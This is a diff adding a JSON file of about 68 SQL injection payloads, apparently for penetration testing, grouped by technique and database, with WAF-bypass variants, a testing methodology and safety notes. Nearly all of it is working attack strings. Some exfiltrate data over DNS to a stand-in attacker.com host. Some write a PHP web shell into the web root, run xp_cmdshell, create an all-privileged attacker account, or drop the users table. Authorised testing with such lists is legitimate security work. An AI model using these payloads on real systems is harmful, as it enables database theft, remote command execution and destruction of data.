@@ -1,0 +1,241 @@
+{
+  "metadata": {
+    "version": "1.0",
+    "last_updated": "2024-01-15",
+    "total_payloads": 68,
+    "categories": 8
+  },
+  
+  "attack_categories": {
+    "authentication_bypass": {
+      "description": "Bypass login mechanisms",
+      "payloads": [
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "' OR '1'='1' #",
+        "admin' --",
+        "' OR '1'='1' /*",
+        "admin' #",
+        "'='",
+        "' OR ''='",
+        "' OR 1=1 --",
+        "' OR 1=1 #",
+        "' OR 1=1/*",
+        "') OR ('1'='1",
+        "admin' OR '1'='1'"
+      ]
+    },
+    
+    "union_based": {
+      "description": "Extract data using UNION clauses",
+      "payloads": [
+        "' UNION SELECT NULL --",
+        "' UNION SELECT NULL, NULL --",
+        "' UNION SELECT NULL, NULL, NULL --",
+        "' UNION SELECT 1,2,3 --",
+        "' UNION SELECT version(), database(), user() --",
+        "' UNION SELECT table_name, column_name FROM information_schema.columns --",
+        "' UNION SELECT 1, concat(username, ':', password) FROM users --",
+        "' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --"
+      ]
+    },
+    
+    "error_based": {
+      "description": "Extract information through error messages",
+      "payloads": [
+        "' AND extractvalue(rand(),concat(0x3a,version())) --",
+        "' AND updatexml(rand(),concat(0x3a,version()),null) --",
+        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
+        "' AND (SELECT * FROM (SELECT(SLEEP(5)))b) --",
+        "convert(int,@@version)",
+        "cast(@@version as int)",
+        "' and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a) --"
+      ]
+    },
+    
+    "time_based": {
+      "description": "Blind SQL injection using time delays",
+      "payloads": [
+        "' AND SLEEP(5) --",
+        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
+        "'; WAITFOR DELAY '00:00:05' --",
+        "' OR pg_sleep(5) --",
+        "' AND if(1=1, sleep(5), 0) --",
+        "' AND benchmark(10000000,md5('test')) --",
+        "' UNION SELECT SLEEP(5), NULL --",
+        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5) --"
+      ]
+    },
+    
+    "boolean_based": {
+      "description": "Blind SQL injection using boolean conditions",
+      "payloads": [
+        "' AND 1=1 --",
+        "' AND 1=2 --",
+        "' AND (SELECT substring(version(),1,1))='5' --",
+        "' AND (SELECT ascii(substring(version(),1,1))) = 53 --",
+        "' AND (SELECT length(version())) > 0 --",
+        "' AND (SELECT ascii(substring(database(),1,1))) > 97 --",
+        "' AND (SELECT user()) = 'root@localhost' --"
+      ]
+    },
+    
+    "out_of_band": {
+      "description": "Extract data via DNS or HTTP requests",
+      "payloads": [
+        "' || (SELECT LOAD_FILE(concat('\\\\\\\\',(SELECT version()),'.attacker.com\\\\test.txt'))) --",
+        "' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt' --",
+        "'; EXEC xp_dirtree '\\\\\\\\attacker.com\\\\test' --",
+        "' UNION SELECT 1,2,3 INTO DUMPFILE '/var/www/html/backdoor.php' --",
+        "'; DECLARE @q varchar(1024); SET @q = '\\\\\\\\' + (SELECT @@version) + '.attacker.com\\\\test'; EXEC master..xp_dirtree @q; --"
+      ]
+    },
+    
+    "second_order": {
+      "description": "Stored/triggered injection attacks",
+      "payloads": [
+        "admin'); INSERT INTO users (username, password) VALUES ('hacker', 'pass123'); --",
+        "admin'); UPDATE users SET password = 'hacked' WHERE username = 'admin'; --",
+        "admin'); DROP TABLE users; --",
+        "test@test.com', (SELECT @@version)); --",
+        "admin'); CREATE USER 'attacker'@'%' IDENTIFIED BY 'password123'; GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%'; --"
+      ]
+    },
+    
+    "advanced_techniques": {
+      "description": "Complex and obfuscated payloads",
+      "payloads": [
+        "'/**/OR/**/1=1--",
+        "'%55NION%53ELECT",
+        "'+UnIoN+SeLeCt+",
+        "' || 1=1 --",
+        "' XOR 1=1 --",
+        "' and (select 1)='1",
+        "' /*!50000union*/ select 1,2,3 --",
+        "' /*!union*/ select 1,2,3 --",
+        "'/**/union/**/select/**/1,2,3--",
+        "'%0Aunion%0Aselect%0A1,2,3--"
+      ]
+    }
+  },
+  
+  "database_specific": {
+    "mysql": {
+      "payloads": [
+        "' UNION SELECT @@version, NULL --",
+        "' AND SLEEP(5) --",
+        "' AND benchmark(10000000,md5('test')) --",
+        "' INTO OUTFILE '/tmp/test.txt' --",
+        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --"
+      ]
+    },
+    
+    "postgresql": {
+      "payloads": [
+        "' UNION SELECT version(), NULL --",
+        "' OR pg_sleep(5) --",
+        "'; COPY (SELECT '<?php system($_GET[\"cmd\"]) ?>') TO '/var/www/html/shell.php' --",
+        "' AND (SELECT pg_sleep(5)) --"
+      ]
+    },
+    
+    "mssql": {
+      "payloads": [
+        "' UNION SELECT @@version, NULL --",
+        "'; WAITFOR DELAY '00:00:05' --",
+        "'; EXEC xp_cmdshell 'dir' --",
+        "' AND 1=CONVERT(int, @@version) --"
+      ]
+    },
+    
+    "oracle": {
+      "payloads": [
+        "' UNION SELECT banner FROM v$version WHERE rownum=1 --",
+        "' AND (SELECT COUNT(*) FROM all_users) > 0 --",
+        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) = 1 --",
+        "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END FROM dual) IS NULL --"
+      ]
+    }
+  },
+  
+  "obfuscation_techniques": {
+    "encoding": [
+      "' OR 1=1 --",
+      "%27%20OR%201%3D1%20--",
+      "'/**/OR/**/1=1--",
+      "'+OR+1=1--",
+      "'%0AOR%0A1=1--"
+    ],
+    
+    "case_variation": [
+      "' Or '1'='1",
+      "' oR '1'='1",
+      "' OR '1'='1",
+      "' or '1'='1",
+      "' Or '1'='1' --"
+    ],
+    
+    "whitespace_manipulation": [
+      "'OR'1'='1",
+      "'  OR  '1'='1",
+      "'\tOR\t'1'='1",
+      "'\nOR\n'1'='1",
+      "'\rOR\r'1'='1"
+    ],
+    
+    "comment_techniques": [
+      "' OR '1'='1' --",
+      "' OR '1'='1' #",
+      "' OR '1'='1' /*",
+      "' OR '1'='1'/**/",
+      "' OR '1'='1'-- -"
+    ]
+  },
+  
+  "prevention_testing": {
+    "bypass_attempts": [
+      "'/**/UNION/**/SELECT/**/1,2,3--",
+      "'%55NION%53ELECT%201,2,3--",
+      "'+un/**/ion+sel/**/ect+1,2,3--",
+      "'/*!50000union*/ select 1,2,3--",
+      "'/*!union*/ select 1,2,3--"
+    ],
+    
+    "waf_bypass": [
+      "' anD '1'='1",
+      "' And '1'='1",
+      "'/*!50000And*/ '1'='1",
+      "'%0Aand%0A'1'='1",
+      "'/*!and*/ '1'='1"
+    ]
+  },
+  
+  "references": {
+    "owasp_top_10": "https://owasp.org/www-project-top-ten/",
+    "sql_injection_cheat_sheet": "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+    "payloads_all_the_things": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection",
+    "mitre_att&ck": "https://attack.mitre.org/techniques/T1190/"
+  },
+  
+  "testing_methodology": {
+    "steps": [
+      "1. Identify injection points",
+      "2. Test for error-based injection",
+      "3. Test for boolean-based blind injection",
+      "4. Test for time-based blind injection",
+      "5. Test for UNION-based injection",
+      "6. Attempt to extract database information",
+      "7. Attempt to extract table data",
+      "8. Test for out-of-band extraction",
+      "9. Test for second-order injection"
+    ],
+    
+    "safety_notes": [
+      "Only test on authorized systems",
+      "Use test environments only",
+      "Obtain proper permissions",
+      "Document all findings",
+      "Clean up after testing"
+    ]
+  }
+}
